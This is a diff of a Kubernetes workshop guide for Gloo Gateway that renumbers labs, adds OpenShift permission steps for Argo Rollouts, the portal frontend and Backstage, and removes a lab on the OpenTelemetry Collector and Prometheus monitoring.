-      -- curl -sS 'http://localhost:19000/stats?format=json&filter=listener_manager.lds.update_success' | \
-      jq '.stats[].value') -gt ${LAST_LDS_UPDATE_COUNT} ]]; then
-    echo
-    break
-  fi
-done"
--->
 
 The **httpbin** application has some utility endpoints we can use to test that caching is applied.
 First of all, let's make sure that caching is *not* being applied by making a request to the `/cache` endpoint, passing a cache time-to-live (TTL) value of 10 seconds that we want the service to use in the response `cache-control` header:
@@ -3982,9 +4061,18 @@ kubectl --context ${CLUSTER1} -n gloo-system delete httplisteneroption cache
 
 
 
-## Lab 17 - Deploy Argo Rollouts <a name="lab-17---deploy-argo-rollouts-"></a>
+## Lab 18 - Deploy Argo Rollouts <a name="lab-18---deploy-argo-rollouts-"></a>
 
 [Argo Rollouts](https://argoproj.github.io/rollouts/) is a declarative progressive delivery tool for Kubernetes that we can use to update applications gradually, using a blue/green or canary strategy to manage the rollout.
+
+Before installing Argo Rollouts, in OpenShift, we need to create a namespace and grant the necessary permissions:
+
+```bash
+kubectl --context ${CLUSTER1} create ns argo-rollouts
+
+oc --context ${CLUSTER1} adm policy add-scc-to-user anyuid -z argo-rollouts -n argo-rollouts
+oc --context ${CLUSTER1} adm policy add-scc-to-user anyuid -z argo-rollouts-dashboard -n argo-rollouts
+```
 
 Run the following commands to install Argo Rollouts in your environment:
 
@@ -4018,7 +4106,7 @@ Now we're ready to use Argo Rollouts to progressively update applications as par
 
 
 
-## Lab 18 - Roll out a new app version using Argo Rollouts <a name="lab-18---roll-out-a-new-app-version-using-argo-rollouts-"></a>
+## Lab 19 - Roll out a new app version using Argo Rollouts <a name="lab-19---roll-out-a-new-app-version-using-argo-rollouts-"></a>
 
 We're going to use Argo Rollouts to gradually deliver an upgraded version of our httpbin application.
 To do this, we'll define a resource that lets Argo Rollouts know how we want it to handle updates to our application,
@@ -4994,205 +5082,6 @@ EOF
 
 
 
-## Lab 19 - Deploy OpenTelemetry Collector <a name="lab-19---deploy-opentelemetry-collector-"></a>
-
-Having metrics is essential for running applications reliably, and gateways are no exceptions.
-
-Using [OpenTelemetry Collectors](https://github.com/open-telemetry/opentelemetry-collector-contrib) is a nice way to collect, transform, and ship telemetry to your observability backends.
-
-Let's deploy the OSS distribution of OpenTelemetry Collector, and get started!
-
-```bash
-helm repo add open-telemetry https://open-telemetry.github.io/opentelemetry-helm-charts
-helm repo update
-
-helm upgrade --install opentelemetry-collector open-telemetry/opentelemetry-collector \
---version 0.97.1 \
---set mode=deployment \
---set image.repository="otel/opentelemetry-collector-contrib" \
---set command.name="otelcol-contrib" \
---namespace=otel \
---create-namespace \
--f -<<EOF
-clusterRole:
-  create: true
-  rules:
-  - apiGroups:
-    - ''
-    resources:
-    - 'pods'
-    - 'nodes'
-    verbs:
-    - 'get'
-    - 'list'
-    - 'watch'
-ports:
-  promexporter:
-    enabled: true
-    containerPort: 9099
-    servicePort: 9099
-    protocol: TCP
-config:
-  receivers:
-    prometheus/gloo-dataplane:
-      config:
-        scrape_configs:
-        # Scrape the Gloo Gateway pods
-        - job_name: gloo-gateways
-          honor_labels: true
-          kubernetes_sd_configs:
-          - role: pod
-          relabel_configs:
-            - action: keep
-              regex: kube-gateway
-              source_labels:
-              - __meta_kubernetes_pod_label_gloo
-            - source_labels: [__meta_kubernetes_pod_annotation_prometheus_io_scrape]
-              action: keep
-              regex: true
-            - source_labels: [__meta_kubernetes_pod_annotation_prometheus_io_path]
-              action: replace
-              target_label: __metrics_path__
-              regex: (.+)
-            - action: replace
-              source_labels:
-              - __meta_kubernetes_pod_ip
-              - __meta_kubernetes_pod_annotation_prometheus_io_port
-              separator: ':'
-              target_label: __address__
-            - action: labelmap
-              regex: __meta_kubernetes_pod_label_(.+)
-            - source_labels: [__meta_kubernetes_namespace]
-              action: replace
-              target_label: kube_namespace
-            - source_labels: [__meta_kubernetes_pod_name]
-              action: replace
-              target_label: pod
-    prometheus/gloo-controlplane:
-      config:
-        scrape_configs:
-        # Scrape the Gloo pods
-        - job_name: gloo-gateways
-          honor_labels: true
-          kubernetes_sd_configs:
-          - role: pod
-          relabel_configs:
-            - action: keep
-              regex: gloo
-              source_labels:
-              - __meta_kubernetes_pod_label_gloo
-            - source_labels: [__meta_kubernetes_pod_annotation_prometheus_io_scrape]
-              action: keep
-              regex: true
-            - source_labels: [__meta_kubernetes_pod_annotation_prometheus_io_path]
-              action: replace
-              target_label: __metrics_path__
-              regex: (.+)
-            - action: replace
-              source_labels:
-              - __meta_kubernetes_pod_ip
-              - __meta_kubernetes_pod_annotation_prometheus_io_port
-              separator: ':'
-              target_label: __address__
-            - action: labelmap
-              regex: __meta_kubernetes_pod_label_(.+)
-            - source_labels: [__meta_kubernetes_namespace]
-              action: replace
-              target_label: kube_namespace
-            - source_labels: [__meta_kubernetes_pod_name]
-              action: replace
-              target_label: pod
-  exporters:
-    prometheus:
-      endpoint: 0.0.0.0:9099
-    debug: {}
-  service:
-    pipelines:
-      metrics:
-        receivers: [prometheus/gloo-dataplane, prometheus/gloo-controlplane]
-        processors: [batch]
-        exporters: [prometheus]
-EOF
-```
-
-This deployment will now scrape our Gateways' metrics, and expose these metrics in Prometheus format.
-
-While you could scrape the Gateway pods directly as well, that might only work if you only want to consume them from the local cluster. Or, you could be standardizing on OpenTelemetry to avoid vendor/project specific agents. In this case, ingesting the metrics into an OTel Collector can make perfect sense, since you can freely transform telemetry data and ship to the backend of your liking.
-
-For simplicity's sake, let's imagine that our desired backend is a local Prometheus instance. Let's get the telemetry data in to that one!
-
-First, let's install kube-prometheus-stack!
-
-```bash
-helm repo add prometheus-community https://prometheus-community.github.io/helm-charts
-helm repo update
-
-helm upgrade --install kube-prometheus-stack \
-prometheus-community/kube-prometheus-stack \
---version 61.2.0 \
---namespace monitoring \
---create-namespace \
---values - <<EOF
-grafana:
-  service:
-    type: LoadBalancer
-    port: 3000
-prometheus:
-  prometheusSpec:
-    ruleSelectorNilUsesHelmValues: false
-    serviceMonitorSelectorNilUsesHelmValues: false
-    podMonitorSelectorNilUsesHelmValues: false
-EOF
-```
-
-Finally, configure scraping for our OTel Collector via a PodMonitor!
-
-```bash
-cat <<EOF | kubectl apply -n otel -f -
-apiVersion: monitoring.coreos.com/v1
-kind: PodMonitor
-metadata:
-  name: otel-monitor
-spec:
-  podMetricsEndpoints:
-  - interval: 30s
-    port: promexporter
-    scheme: http
-  selector:
-    matchLabels:
-      app.kubernetes.io/name: opentelemetry-collector
-EOF
-```
-
-Now let's import a sample dashboard!
-
-```bash
-kubectl -n monitoring create cm envoy-dashboard \
---from-file=data/steps/deploy-otel-collector/envoy.json
-kubectl label -n monitoring cm envoy-dashboard grafana_dashboard=1
-```
-
-Let's generate some traffic!
-
-```shell,run
-for i in {1..5}; do curl https://httpbin.example.com/get -v; done
-```
-
-
-To access Grafana, you need to get the endpoint using the following command:
-
-```bash
-echo "http://$(kubectl --context ${CLUSTER1} -n monitoring get svc kube-prometheus-stack-grafana -o jsonpath='{.status.loadBalancer.ingress[0].*}'):3000"
-```
-
-
-Login with `admin` and `prom-operator` you should be able to see how traffic flows trough your Gateways!
-			    
-![Envoy dashboard](images/steps/deploy-otel-collector/envoy.png)
-
-
-
-
 ## Lab 20 - Deploy the Bookinfo sample application <a name="lab-20---deploy-the-bookinfo-sample-application-"></a>
 [<img src="https://img.youtube.com/vi/nzYcrjalY5A/maxresdefault.jpg" alt="VIDEO LINK" width="560" height="315"/>](https://youtu.be/nzYcrjalY5A "Video Link")
 
@@ -6139,6 +6028,12 @@ We'll create it later.
 
 The developer frontend is provided as a fully functional template to allow you to customize it based on your own requirements.
 
+In OpenShift, we need to grant the necessary permissions before deploying the portal frontend:
+
+```bash
+oc adm policy add-scc-to-user anyuid -z portal-frontend -n gloo-system
+```
+
 Let's deploy it:
 
 ```bash
@@ -6578,6 +6473,9 @@ Let's deploy Backstage:
 
 ```bash
 kubectl --context ${CLUSTER1} apply -f data/steps/dev-portal-backstage-backend/rbac.yaml
+
+oc adm policy add-scc-to-user anyuid -z backstage -n gloo-system
+oc adm policy add-scc-to-user privileged -z backstage -n gloo-system
 
 kubectl apply --context ${CLUSTER1} -f - <<EOF
 apiVersion: v1
